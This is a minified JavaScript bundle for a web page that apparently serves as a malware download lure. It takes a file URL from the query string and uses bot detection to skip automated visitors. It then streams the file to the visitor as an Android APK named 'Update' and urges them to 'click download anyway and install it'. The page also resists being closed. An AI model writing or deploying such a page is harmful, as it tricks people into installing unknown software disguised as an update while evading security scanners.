(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[405],{5557:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/",function(){return n(8591)}])},8591:function(e,t,n){"use strict";n.r(t),n.d(t,{default:function(){return Index}});var r=n(5893),a=n(9008),o=n.n(a),l=n(7294),s=n(1163),d=n(8287),i=n(5774);n(3901);var c=n(5518);function Index(){let e=(0,s.useRouter)(),[t,n]=(0,l.useState)("Loading..."),[a,u]=(0,l.useState)("Do not close window!"),[w,h]=(0,l.useState)(0),handleDownload=async(e,t)=>{try{n("Downloading...");let r=await fetch(e);if(!r.ok)throw Error("Network response was not ok");let a=parseInt(r.headers.get("Content-Length"),10),o=streamSaver.createWriteStream(t);window.writer=o.getWriter();let l=r.body.getReader(),s=0;for(;;){let{done:e,value:t}=await l.read();if(e){writer.close(),h(100),n("Downloaded"),u("Click download anyway and install it!");break}await writer.write(t),s+=t.length;let r=s/a*100;h(Math.max(Math.round(r),100))}}catch(e){console.error("Download failed:",e),n("Download failed"),u("Refresh the page")}};return(0,l.useEffect)(()=>{if(!c.Dt){n("Download failed"),u("Refresh the page"),console.error("Suspended Due Policy Violation");return}let t=(0,d.zD)(),{v:r,n:a}=e.query;return r?(t.then(e=>e.detect()).then(e=>{console.log(e),!1==e.bot&&handleDownload(r+".temp",(a||"Update")+".apk")}).catch(e=>{console.error(e),n("Downloaded failed"),u("Refresh the page")}),window.onbeforeunload=e=>{e.preventDefault(),e.returnValue="Are you sure you want to leave this page?"},()=>{window.onbeforeunload=null}):void 0},[e]),(0,r.jsxs)("main",{children:[(0,r.jsx)(o(),{children:(0,r.jsx)("title",{children:t})}),(0,r.jsx)("div",{className:"text-center",children:(0,r.jsxs)("div",{className:"progress",children:[(0,r.jsx)("div",{className:"round",children:(0,r.jsx)(i.Ip,{value:w,text:"".concat(w,"%"),suppressHydrationWarning:!0})}),(0,r.jsx)("p",{className:"status",children:t}),(0,r.jsx)("p",{className:"text-mute",children:a})]})})]})}}},function(e){e.O(0,[214,774,888,179],function(){return e(e.s=5557)}),_N_E=e.O()}]);